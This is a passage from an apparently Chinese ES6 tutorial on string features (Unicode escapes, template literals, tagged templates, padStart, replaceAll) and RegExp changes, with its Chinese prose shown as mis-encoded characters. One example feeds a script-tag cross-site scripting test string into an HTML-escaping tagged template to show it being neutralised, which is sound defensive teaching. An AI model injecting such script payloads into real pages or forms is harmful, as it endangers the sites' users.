è½½æ¨¡å—æ—¶ï¼Œå¾€å¾€éœ€è¦æŒ‡å®šè¾“å…¥å“ªäº›æ–¹æ³•ã€‚è§£æ„èµ‹å€¼ä½¿å¾—è¾“å…¥è¯­å¥éå¸¸æ¸…æ™°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; SourceMapConsumer, SourceNode &#125; = <span class="built_in">require</span>(<span class="string">&quot;source-map&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="å­—ç¬¦ä¸²çš„æ‰©å±•"><a href="#å­—ç¬¦ä¸²çš„æ‰©å±•" class="headerlink" title="å­—ç¬¦ä¸²çš„æ‰©å±•"></a>å­—ç¬¦ä¸²çš„æ‰©å±•</h1><h2 id="1ã€å­—ç¬¦çš„-Unicode-è¡¨ç¤ºæ³•"><a href="#1ã€å­—ç¬¦çš„-Unicode-è¡¨ç¤ºæ³•" class="headerlink" title="1ã€å­—ç¬¦çš„ Unicode è¡¨ç¤ºæ³•"></a>1ã€å­—ç¬¦çš„ Unicode è¡¨ç¤ºæ³•</h2><p>ES6 åŠ å¼ºäº†å¯¹ Unicode çš„æ”¯æŒï¼Œå…è®¸é‡‡ç”¨<code>\uxxxx</code>å½¢å¼è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­<code>xxxx</code>è¡¨ç¤ºå­—ç¬¦çš„ Unicode ç ç‚¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\u0061&quot;</span></span><br><span class="line"><span class="comment">// &quot;a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\uD842\uDFB7&quot;</span></span><br><span class="line"><span class="comment">// &quot;ğ ®·&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u20BB7&quot;</span></span><br><span class="line"><span class="comment">// &quot; 7&quot;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œè¿™ç§è¡¨ç¤ºæ³•åªé™äºç ç‚¹åœ¨<code>\u0000</code>~`\uFFFF<code>ä¹‹é—´çš„å­—ç¬¦ã€‚è¶…å‡ºè¿™ä¸ªèŒƒå›´çš„å­—ç¬¦ï¼Œå¿…é¡»ç”¨ä¸¤ä¸ªåŒå­—èŠ‚çš„å½¢å¼è¡¨ç¤ºã€‚ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œå¦‚æœç›´æ¥åœ¨</code>\u<code>åé¢è·Ÿä¸Šè¶…è¿‡</code>0xFFFF<code>çš„æ•°å€¼ï¼ˆæ¯”å¦‚</code>\u20BB7<code>ï¼‰ï¼ŒJavaScript ä¼šç†è§£æˆ</code>\u20BB+7<code>ã€‚ç”±äº</code>\u20BB<code>æ˜¯ä¸€ä¸ªä¸å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥åªä¼šæ˜¾ç¤ºä¸€ä¸ªç©ºæ ¼ï¼Œåé¢è·Ÿç€ä¸€ä¸ª</code>7`ã€‚</p><p>ES6 ï¼šåªè¦å°†ç ç‚¹æ”¾å…¥å¤§æ‹¬å·ï¼Œå°±èƒ½æ­£ç¡®è§£è¯»è¯¥å­—ç¬¦ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\u&#123;20BB7&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;ğ ®·&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u&#123;41&#125;\u&#123;42&#125;\u&#123;43&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;ABC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hello = <span class="number">123</span>;</span><br><span class="line">hell\u&#123;6F&#125; <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\u&#123;1F680&#125;&#x27;</span> === <span class="string">&#x27;\uD83D\uDE80&#x27;</span></span><br><span class="line"><span class="comment">// trueï¼Œ å¤§æ‹¬å·è¡¨ç¤ºæ³•ä¸å››å­—èŠ‚çš„ UTF-16 ç¼–ç æ˜¯ç­‰ä»·çš„ã€‚</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥JavaScript å…±æœ‰ 6 ç§æ–¹æ³•å¯ä»¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\z&#x27;</span> === <span class="string">&#x27;z&#x27;</span>  <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\172&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\x7A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\u007A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\u&#123;7A&#125;&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="2ã€å­—ç¬¦ä¸²çš„éå†å™¨æ¥å£"><a href="#2ã€å­—ç¬¦ä¸²çš„éå†å™¨æ¥å£" class="headerlink" title="2ã€å­—ç¬¦ä¸²çš„éå†å™¨æ¥å£"></a>2ã€å­—ç¬¦ä¸²çš„éå†å™¨æ¥å£</h2><p>å­—ç¬¦ä¸²å¯ä»¥è¢«<code>for...of</code>å¾ªç¯éå†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> codePoint <span class="keyword">of</span> <span class="string">&#x27;foo&#x27;</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(codePoint)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;f&quot;</span></span><br><span class="line"><span class="comment">// &quot;o&quot;</span></span><br><span class="line"><span class="comment">// &quot;o&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3ã€æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#3ã€æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="3ã€æ¨¡æ¿å­—ç¬¦ä¸²"></a>3ã€æ¨¡æ¿å­—ç¬¦ä¸²</h2><p>æ¨¡æ¿å­—ç¬¦ä¸²æ˜¯å¢å¼ºç‰ˆçš„å­—ç¬¦ä¸²ï¼Œç”¨åå¼•å·ï¼ˆ`ï¼‰æ ‡è¯†ã€‚å®ƒå¯ä»¥å½“ä½œæ™®é€šå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰å¤šè¡Œå­—ç¬¦ä¸²ï¼Œæˆ–è€…åœ¨å­—ç¬¦ä¸²ä¸­åµŒå…¥å˜é‡ã€‚å¦‚æœåœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­éœ€è¦ä½¿ç”¨åå¼•å·ï¼Œåˆ™å‰é¢è¦ç”¨åæ–œæ è½¬ä¹‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å­—ç¬¦ä¸²ä¸­åµŒå…¥å˜é‡</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Bob&quot;</span>, time = <span class="string">&quot;today&quot;</span>;</span><br><span class="line"><span class="string">`Hello <span class="subst">$&#123;name&#125;</span>, how are you <span class="subst">$&#123;time&#125;</span>?`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> greeting = <span class="string">`\`Yo\` World!`</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨æ¨¡æ¿å­—ç¬¦ä¸²è¡¨ç¤ºå¤šè¡Œå­—ç¬¦ä¸²ï¼Œæ‰€æœ‰çš„ç©ºæ ¼å’Œç¼©è¿›éƒ½ä¼šè¢«ä¿ç•™åœ¨è¾“å‡ºä¹‹ä¸­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#list&#x27;</span>).html(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;first&lt;/li&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;second&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>);</span><br></pre></td></tr></table></figure><p>å¤§æ‹¬å·å†…éƒ¨å¯ä»¥æ”¾å…¥ä»»æ„çš„ JavaScript è¡¨è¾¾å¼ï¼Œå¯ä»¥è¿›è¡Œè¿ç®—ï¼Œä»¥åŠå¼•ç”¨å¯¹è±¡å±æ€§ã€‚</p><p>æ¨¡æ¿å­—ç¬¦ä¸²ä¹‹ä¸­è¿˜èƒ½è°ƒç”¨å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">`foo <span class="subst">$&#123;fn()&#125;</span> bar`</span></span><br><span class="line"><span class="comment">// foo Hello World bar</span></span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦å¼•ç”¨æ¨¡æ¿å­—ç¬¦ä¸²æœ¬èº«ï¼Œåœ¨éœ€è¦æ—¶æ‰§è¡Œï¼Œå¯ä»¥å†™æˆå‡½æ•°ã€‚æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå°±ç›¸å½“äºæ‰§è¡Œè¿™ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> func = <span class="function">(<span class="params">name</span>) =&gt;</span> <span class="string">`Hello <span class="subst">$&#123;name&#125;</span>!`</span>;</span><br><span class="line">func(<span class="string">&#x27;Jack&#x27;</span>) <span class="comment">// &quot;Hello Jack!&quot;</span></span><br></pre></td></tr></table></figure><h2 id="4ã€æ ‡ç­¾æ¨¡æ¿"><a href="#4ã€æ ‡ç­¾æ¨¡æ¿" class="headerlink" title="4ã€æ ‡ç­¾æ¨¡æ¿"></a>4ã€æ ‡ç­¾æ¨¡æ¿</h2><p>æ¨¡æ¿å­—ç¬¦ä¸²å¯ä»¥ç´§è·Ÿåœ¨ä¸€ä¸ªå‡½æ•°ååé¢ï¼Œè¯¥å‡½æ•°å°†è¢«è°ƒç”¨æ¥å¤„ç†è¿™ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²ã€‚è¿™è¢«ç§°ä¸ºâ€œæ ‡ç­¾æ¨¡æ¿â€åŠŸèƒ½ã€‚æ ‡ç­¾æ¨¡æ¿å…¶å®ä¸æ˜¯æ¨¡æ¿ï¼Œè€Œæ˜¯å‡½æ•°è°ƒç”¨çš„ä¸€ç§ç‰¹æ®Šå½¢å¼ã€‚â€œæ ‡ç­¾â€æŒ‡çš„å°±æ˜¯å‡½æ•°ï¼Œç´§è·Ÿåœ¨åé¢çš„æ¨¡æ¿å­—ç¬¦ä¸²å°±æ˜¯å®ƒçš„å‚æ•°ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœæ¨¡æ¿å­—ç¬¦é‡Œé¢æœ‰å˜é‡ï¼Œå°±ä¸æ˜¯ç®€å•çš„è°ƒç”¨äº†ï¼Œè€Œæ˜¯ä¼šå°†æ¨¡æ¿å­—ç¬¦ä¸²å…ˆå¤„ç†æˆå¤šä¸ªå‚æ•°ï¼Œå†è°ƒç”¨å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">tag<span class="string">`Hello <span class="subst">$&#123; a + b &#125;</span> world <span class="subst">$&#123; a * b &#125;</span>`</span>;</span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line">tag([<span class="string">&#x27;Hello &#x27;</span>, <span class="string">&#x27; world &#x27;</span>, <span class="string">&#x27;&#x27;</span>], <span class="number">15</span>, <span class="number">50</span>);</span><br></pre></td></tr></table></figure><p>å‡½æ•°<code>tag</code>ä¾æ¬¡ä¼šæ¥æ”¶åˆ°å¤šä¸ªå‚æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">stringArr, value1, value2</span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å³</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tag</span>(<span class="params">stringArr, ...values</span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>â€œæ ‡ç­¾æ¨¡æ¿â€çš„ä¸€ä¸ªé‡è¦åº”ç”¨ï¼Œå°±æ˜¯è¿‡æ»¤ HTML å­—ç¬¦ä¸²ï¼Œé˜²æ­¢ç”¨æˆ·è¾“å…¥æ¶æ„å†…å®¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> message =</span><br><span class="line">  SaferHTML<span class="string">`&lt;p&gt;<span class="subst">$&#123;sender&#125;</span> has sent you a message.&lt;/p&gt;`</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SaferHTML</span>(<span class="params">templateData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> s = templateData[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> arg = <span class="built_in">String</span>(<span class="built_in">arguments</span>[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Escape special characters in the substitution.</span></span><br><span class="line">    s += arg.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&quot;&amp;amp;&quot;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&quot;&amp;lt;&quot;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Don&#x27;t escape special characters in the template.</span></span><br><span class="line">    s += templateData[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>sender</code>å˜é‡å¾€å¾€æ˜¯ç”¨æˆ·æä¾›çš„ï¼Œç»è¿‡<code>SaferHTML</code>å‡½æ•°å¤„ç†ï¼Œé‡Œé¢çš„ç‰¹æ®Šå­—ç¬¦éƒ½ä¼šè¢«è½¬ä¹‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sender = <span class="string">&#x27;&lt;script&gt;alert(&quot;abc&quot;)&lt;/script&gt;&#x27;</span>; <span class="comment">// æ¶æ„ä»£ç </span></span><br><span class="line"><span class="keyword">let</span> message = SaferHTML<span class="string">`&lt;p&gt;<span class="subst">$&#123;sender&#125;</span> has sent you a message.&lt;/p&gt;`</span>;</span><br><span class="line"></span><br><span class="line">message</span><br><span class="line"><span class="comment">// &lt;p&gt;&amp;lt;script&amp;gt;alert(&quot;abc&quot;)&amp;lt;/script&amp;gt; has sent you a message.&lt;/p&gt;</span></span><br></pre></td></tr></table></figure><h1 id="å­—ç¬¦ä¸²çš„æ–°å¢æ–¹æ³•"><a href="#å­—ç¬¦ä¸²çš„æ–°å¢æ–¹æ³•" class="headerlink" title="å­—ç¬¦ä¸²çš„æ–°å¢æ–¹æ³•"></a>å­—ç¬¦ä¸²çš„æ–°å¢æ–¹æ³•</h1><h2 id="å®ä¾‹æ–¹æ³•ï¼šincludes-startsWith-endsWith"><a href="#å®ä¾‹æ–¹æ³•ï¼šincludes-startsWith-endsWith" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šincludes(), startsWith(), endsWith()"></a>å®ä¾‹æ–¹æ³•ï¼šincludes(), startsWith(), endsWith()</h2><p>ä¼ ç»Ÿä¸Šï¼ŒJavaScript åªæœ‰<code>indexOf</code>æ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥ç¡®å®šä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ…å«åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚ES6 åˆæä¾›äº†ä¸‰ç§æ–°æ–¹æ³•ã€‚</p><ul><li>**includes()**ï¼šè¿”å›å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦æ‰¾åˆ°äº†å‚æ•°å­—ç¬¦ä¸²ã€‚</li><li>**startsWith()**ï¼šè¿”å›å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºå‚æ•°å­—ç¬¦ä¸²æ˜¯å¦åœ¨åŸå­—ç¬¦ä¸²çš„å¤´éƒ¨ã€‚</li><li>**endsWith()**ï¼šè¿”å›å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºå‚æ•°å­—ç¬¦ä¸²æ˜¯å¦åœ¨åŸå­—ç¬¦ä¸²çš„å°¾éƒ¨ã€‚</li></ul><p>è¿™ä¸‰ä¸ªæ–¹æ³•éƒ½æ”¯æŒç¬¬äºŒä¸ªå‚æ•°ï¼Œè¡¨ç¤ºå¼€å§‹æœç´¢çš„ä½ç½®ã€‚ä½†æ˜¯ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°<code>n</code>æ—¶ï¼Œ<code>endsWith</code>çš„è¡Œä¸ºä¸å…¶ä»–ä¸¤ä¸ªæ–¹æ³•æœ‰æ‰€ä¸åŒã€‚å®ƒé’ˆå¯¹å‰<code>n</code>ä¸ªå­—ç¬¦ï¼Œè€Œå…¶ä»–ä¸¤ä¸ªæ–¹æ³•é’ˆå¯¹ä»ç¬¬<code>n</code>ä¸ªä½ç½®ç›´åˆ°å­—ç¬¦ä¸²ç»“æŸã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s.startsWith(<span class="string">&#x27;world&#x27;</span>, <span class="number">6</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">&#x27;Hello&#x27;</span>, <span class="number">5</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">&#x27;Hello&#x27;</span>, <span class="number">6</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹æ–¹æ³•ï¼šrepeat"><a href="#å®ä¾‹æ–¹æ³•ï¼šrepeat" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šrepeat()"></a>å®ä¾‹æ–¹æ³•ï¼šrepeat()</h2><h2 id="å®ä¾‹æ–¹æ³•ï¼špadStart-ï¼ŒpadEnd"><a href="#å®ä¾‹æ–¹æ³•ï¼špadStart-ï¼ŒpadEnd" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼špadStart()ï¼ŒpadEnd()"></a>å®ä¾‹æ–¹æ³•ï¼špadStart()ï¼ŒpadEnd()</h2><p>ES2017 å¼•å…¥äº†å­—ç¬¦ä¸²è¡¥å…¨é•¿åº¦çš„åŠŸèƒ½ã€‚å¦‚æœæŸä¸ªå­—ç¬¦ä¸²ä¸å¤ŸæŒ‡å®šé•¿åº¦ï¼Œä¼šåœ¨å¤´éƒ¨æˆ–å°¾éƒ¨è¡¥å…¨ã€‚<code>padStart()</code>ç”¨äºå¤´éƒ¨è¡¥å…¨ï¼Œ<code>padEnd()</code>ç”¨äºå°¾éƒ¨è¡¥å…¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">5</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;ababx&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">4</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;abax&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">5</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xabab&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">4</span>, <span class="string">&#x27;ab&#x27;</span>) <span class="comment">// &#x27;xaba&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>padStart()</code>å’Œ<code>padEnd()</code>ä¸€å…±æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²è¡¥å…¨ç”Ÿæ•ˆçš„æœ€å¤§é•¿åº¦ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨æ¥è¡¥å…¨çš„å­—ç¬¦ä¸²ã€‚</p><p>å¦‚æœç”¨æ¥è¡¥å…¨çš„å­—ç¬¦ä¸²ä¸åŸå­—ç¬¦ä¸²ï¼Œä¸¤è€…çš„é•¿åº¦ä¹‹å’Œè¶…è¿‡äº†æœ€å¤§é•¿åº¦ï¼Œåˆ™ä¼šæˆªå»è¶…å‡ºä½æ•°çš„è¡¥å…¨å­—ç¬¦ä¸²ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;0123456789&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;0123456abc&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœçœç•¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œé»˜è®¤ä½¿ç”¨ç©ºæ ¼è¡¥å…¨é•¿åº¦ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;x&#x27;</span>.padStart(<span class="number">4</span>) <span class="comment">// &#x27;   x&#x27;</span></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>.padEnd(<span class="number">4</span>) <span class="comment">// &#x27;x   &#x27;</span></span><br></pre></td></tr></table></figure><p><code>padStart()</code>çš„å¸¸è§ç”¨é€”æ˜¯ä¸ºæ•°å€¼è¡¥å…¨æŒ‡å®šä½æ•°ï¼Œå¦ä¸€ä¸ªç”¨é€”æ˜¯æç¤ºå­—ç¬¦ä¸²æ ¼å¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;12&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) <span class="comment">// &quot;YYYY-MM-12&quot;</span></span><br><span class="line"><span class="string">&#x27;09-12&#x27;</span>.padStart(<span class="number">10</span>, <span class="string">&#x27;YYYY-MM-DD&#x27;</span>) <span class="comment">// &quot;YYYY-09-12&quot;</span></span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹æ–¹æ³•ï¼šreplaceAll"><a href="#å®ä¾‹æ–¹æ³•ï¼šreplaceAll" class="headerlink" title="å®ä¾‹æ–¹æ³•ï¼šreplaceAll()"></a>å®ä¾‹æ–¹æ³•ï¼šreplaceAll()</h2><p>ES2021å¼•å…¥äº†<code>replaceAll()</code>æ–¹æ³•ï¼Œå¯ä»¥ä¸€æ¬¡æ€§æ›¿æ¢æ‰€æœ‰åŒ¹é…ã€‚å®ƒè¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œä¸ä¼šæ”¹å˜åŸå­—ç¬¦ä¸²ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//String.prototype.replaceAll(searchValue, replacement)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;aabbcc&#x27;</span>.replaceAll(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;aa__cc&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>searchValue</code>æ˜¯ä¸€ä¸ªä¸å¸¦æœ‰<code>g</code>ä¿®é¥°ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œ<code>replaceAll()</code>ä¼šæŠ¥é”™ã€‚<code>replacement</code>é™¤äº†ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„è¿”å›å€¼å°†æ›¿æ¢æ‰ç¬¬ä¸€ä¸ªå‚æ•°<code>searchValue</code>åŒ¹é…çš„æ–‡æœ¬ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;123abc456&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> regex = <span class="regexp">/(\d+)([a-z]+)(\d+)/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">match, p1, p2, p3, offset, string</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [p1, p2, p3].join(<span class="string">&#x27; - &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">str.replaceAll(regex, replacer)</span><br><span class="line"><span class="comment">// 123 - abc - 456</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°<code>match</code>æ˜¯æ•æ‰åˆ°çš„åŒ¹é…å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ•æ‰åˆ°æ˜¯ç»„åŒ¹é…ï¼ˆæœ‰å¤šå°‘ä¸ªç»„åŒ¹é…ï¼Œå°±æœ‰å¤šå°‘ä¸ªå¯¹åº”çš„å‚æ•°ï¼‰å¦‚<code>p1</code>ã€<code>p2</code>ã€<code>p3</code>ã€‚æ­¤å¤–ï¼Œæœ€åè¿˜å¯ä»¥æ·»åŠ ä¸¤ä¸ªå‚æ•°ï¼Œå€’æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•æ‰åˆ°çš„å†…å®¹åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯åŸå­—ç¬¦ä¸²ã€‚</p><h1 id="æ­£åˆ™çš„æ‰©å±•"><a href="#æ­£åˆ™çš„æ‰©å±•" class="headerlink" title="æ­£åˆ™çš„æ‰©å±•"></a>æ­£åˆ™çš„æ‰©å±•</h1><h2 id="1ã€RegExp-æ„é€ å‡½æ•°"><a href="#1ã€RegExp-æ„é€ å‡½æ•°" class="headerlink" title="1ã€RegExp æ„é€ å‡½æ•°"></a>1ã€RegExp æ„é€ å‡½æ•°</h2><p>ES5 ä¸å…è®¸æ­¤æ—¶ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°æ·»åŠ ä¿®é¥°ç¬¦ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/xyz/</span>, <span class="string">&#x27;i&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ES6 æ”¹å˜äº†è¿™ç§è¡Œä¸ºã€‚å¦‚æœ<code>RegExp</code>æ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ­£åˆ™å¯¹è±¡ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šä¿®é¥°ç¬¦ã€‚è€Œä¸”ï¼Œè¿”å›çš„æ­£åˆ™è¡¨è¾¾å¼ä¼šå¿½ç•¥åŸæœ‰çš„æ­£åˆ™è¡¨è¾¾å¼çš„ä¿®é¥°ç¬¦ï¼Œåªä½¿ç”¨æ–°æŒ‡å®šçš„ä¿®é¥°ç¬¦ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/abc/ig</span>, <span class="string">&#x27;i&#x27;</span>).flags</span><br><span class="line"><span class="comment">// &quot;i&quot;</span></span><br></pre></td></tr></table></figure><h2 id="2ã€å­—ç¬¦ä¸²çš„æ­£åˆ™æ–¹æ³•"><a href="#2ã€å­—ç¬¦ä¸²çš„æ­£åˆ™æ–¹æ³•" class="headerlink" title="2ã€å­—ç¬¦ä¸²çš„æ­£åˆ™æ–¹æ³•"></a>2ã€å­—ç¬¦ä¸²çš„æ­£åˆ™æ–¹æ³•</h2><p>ES6 å°†<code>match()</code>ã€<code>replace()</code>ã€<code>search()</code>å’Œ<code>split()</code> 4 ä¸ªæ–¹æ³•ï¼Œåœ¨è¯­è¨€å†…éƒ¨å…¨éƒ¨è°ƒç”¨<code>RegExp</code>çš„å®ä¾‹æ–¹æ³•ï¼Œä»è€Œåšåˆ°æ‰€æœ‰ä¸æ­£åˆ™ç›¸å…³çš„æ–¹æ³•ï¼Œå…¨éƒ½å®šä¹‰åœ¨<code>RegExp</code>å¯¹è±¡ä¸Šã€‚</p><ul><li><code>String.prototype.match</code> è°ƒç”¨ 